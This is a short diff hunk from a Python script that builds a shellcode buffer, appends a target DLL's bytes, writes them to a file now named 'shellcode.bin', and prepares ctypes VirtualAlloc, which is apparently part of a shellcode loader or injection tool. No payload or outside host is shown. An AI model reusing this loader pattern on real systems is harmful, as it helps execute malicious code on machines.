@@ -368,7 +368,7 @@ shellcode = bytearray(sh)
 print(shellcode)
 # Write the (shellcode+target_dll) to a file for later use
 with open("target.dll", "rb") as dll_file:  
-   with open("shellcode.sh", "wb") as binary_file:
+   with open("shellcode.bin", "wb") as binary_file:
         shellcode += dll_file.read()
         binary_file.write(shellcode)
 ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
